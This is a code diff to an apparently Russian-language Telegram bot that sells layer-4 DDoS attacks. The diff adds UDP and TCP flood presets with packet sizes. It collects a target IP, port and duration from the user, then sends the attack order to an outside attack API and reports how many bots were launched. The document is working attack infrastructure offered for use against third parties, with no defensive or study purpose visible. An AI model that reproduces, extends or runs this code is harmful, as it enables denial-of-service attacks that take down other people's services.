@@ -3459,46 +3459,32 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 			await bot_instance.answer_callback_query(call.id)
 
 		elif d.startswith('l4_port_'):
-			import base64 as _base64
 			port_val = int(d[8:])
 			await dp_instance.current_state(user=uid).update_data(_l4_port=port_val)
 			port_label = str(port_val) if port_val > 0 else "случайный"
-			# Грузим методы из Lotus API
-			methods = {}
-			try:
-				_auth2 = _base64.b64encode(f"{config.LOTUS_LOGIN}:{config.LOTUS_PASS}".encode()).decode()
-				async with aiohttp.ClientSession() as _s2:
-					async with _s2.get(
-						"https://api.fragment.bond/api/methods",
-						headers={"Authorization": f"Basic {_auth2}"},
-						timeout=aiohttp.ClientTimeout(total=8)
-					) as _r2:
-						if _r2.status == 200:
-							_d2 = await _r2.json()
-							methods = _d2.get("methods", {})
-			except Exception as _e2:
-				print(f"[L4] methods fetch: {_e2}")
-			if not methods:
-				methods = {"udp": "UDP", "syn": "SYN"}
 			mkp2 = types.InlineKeyboardMarkup(row_width=2)
-			for _mn in methods:
-				mkp2.add(types.InlineKeyboardButton(f"⚡ {_mn.upper()}", callback_data=f"l4_m_{_mn}"))
+			for i, (label, _, _flags) in enumerate(_L4_PRESETS):
+				mkp2.add(types.InlineKeyboardButton(f"⚡ {label}", callback_data=f"l4_preset_{i}"))
 			await bot_instance.send_message(
 				call.message.chat.id,
-				f"✅ *Порт:* `{port_label}`\n\n*Выберите метод атаки:*",
+				f"✅ *Порт:* `{port_label}`\n\n*Выберите тип атаки:*",
 				parse_mode="Markdown",
 				reply_markup=mkp2
 			)
 			await bot_instance.answer_callback_query(call.id)
 
-		elif d.startswith('l4_m_'):
-			method = d[5:]
+		elif d.startswith('l4_preset_'):
+			idx = int(d[10:])
+			if idx >= len(_L4_PRESETS):
+				await bot_instance.answer_callback_query(call.id)
+				return
+			preset_label, preset_method, preset_flags = _L4_PRESETS[idx]
 			fsm_data_l4 = await dp_instance.current_state(user=uid).get_data()
-			await dp_instance.current_state(user=uid).update_data(_l4_method=method)
+			await dp_instance.current_state(user=uid).update_data(_l4_method=preset_method, _l4_flags=preset_flags, _l4_preset_label=preset_label)
 			max_time = fsm_data_l4.get('_max_time', 150)
 			await bot_instance.send_message(
 				call.message.chat.id,
-				f"✅ *Метод:* `{method.upper()}`\n\n*Введите время атаки в секундах* (макс. {max_time}):",
+				f"✅ *Тип:* `{preset_label}`\n\n*Введите время атаки в секундах* (макс. {max_time}):",
 				parse_mode="Markdown"
 			)
 			await dp_instance.current_state(chat=uid, user=uid).set_state(WaitL4FSM.time_dur.state)
@@ -4656,6 +4642,14 @@ async def profile_step1(message: types.Message, state: FSMContext):
 				pass
 
 
+# (название для кнопки, метод Lotus API, доп. флаги)
+_L4_PRESETS = [
+	("UDP-PPS  (быстрые пакеты)",  "udp", {"len": "64"}),
+	("UDP-GBPS (тяжёлые пакеты)",  "udp", {"len": "1400"}),
+	("TCP-PPS  (быстрые пакеты)",  "tcp", {"len": "128"}),
+	("TCP-GBPS (тяжёлые пакеты)",  "tcp", {"len": "1400"}),
+]
+
 _L4_SCAN_PORTS = [
 	(80, "HTTP"), (443, "HTTPS"), (8080, "HTTP-alt"), (8443, "HTTPS-alt"),
 	(22, "SSH"), (21, "FTP"), (25, "SMTP"), (3306, "MySQL"), (3389, "RDP"),
@@ -4764,10 +4758,12 @@ async def l4_step_time(message: types.Message, state: FSMContext):
 
 	await state.finish()
 
-	ip      = fsm_data.get('_l4_ip', '')
-	domain  = fsm_data.get('_l4_domain', ip)
-	method  = fsm_data.get('_l4_method', 'udp')
-	port    = fsm_data.get('_l4_port', 0)
+	ip           = fsm_data.get('_l4_ip', '')
+	domain       = fsm_data.get('_l4_domain', ip)
+	method       = fsm_data.get('_l4_method', 'udp')
+	port         = fsm_data.get('_l4_port', 0)
+	extra_flags  = fsm_data.get('_l4_flags', {})
+	preset_label = fsm_data.get('_l4_preset_label', method.upper())
 
 	domain_str = f" (`{domain}`)" if domain != ip else ""
 	port_str   = str(port) if port > 0 else "случайный"
@@ -4776,7 +4772,7 @@ async def l4_step_time(message: types.Message, state: FSMContext):
 		uid,
 		f"⚡ *Запускаю атаку...*\n\n"
 		f"🎯 Цель: `{ip}`{domain_str}\n"
-		f"⚙️ Метод: `{method.upper()}`\n"
+		f"⚙️ Тип: `{preset_label}`\n"
 		f"🔌 Порт: `{port_str}`\n"
 		f"⏱ Время: `{duration} сек`",
 		parse_mode="Markdown"
@@ -4787,6 +4783,7 @@ async def l4_step_time(message: types.Message, state: FSMContext):
 		params = {"target": ip, "time": str(duration), "method": method}
 		if port > 0:
 			params["port"] = str(port)
+		params.update(extra_flags)
 		async with aiohttp.ClientSession() as s:
 			async with s.post(
 				"https://api.fragment.bond/api",
@@ -4806,7 +4803,7 @@ async def l4_step_time(message: types.Message, state: FSMContext):
 				f"✅ *Атака запущена!*\n\n"
 				f"🤖 Ботов: `{bots_count}`\n"
 				f"🎯 Цель: `{ip}:{port_str}`\n"
-				f"⚙️ Метод: `{method.upper()}`\n"
+				f"⚙️ Тип: `{preset_label}`\n"
 				f"⏱ Время: `{duration} сек`",
 				parse_mode="Markdown",
 				reply_markup=keyboards.get_main_menu_markup(lang)
@@ -4816,7 +4813,7 @@ async def l4_step_time(message: types.Message, state: FSMContext):
 				await bot.send_message(
 					bot_logs,
 					f"⚡ *L4 Атака*\n"
-					f"🎯 `{ip}` порт `{port_str}` метод `{method.upper()}` {duration}с\n"
+					f"🎯 `{ip}` порт `{port_str}` тип `{preset_label}` {duration}с\n"
 					f"👤 {_log_uid} (*@{_log_uname}*) [{'prem' if fsm_data.get('_premium') else 'reg'}]",
 					parse_mode="Markdown"
 				)
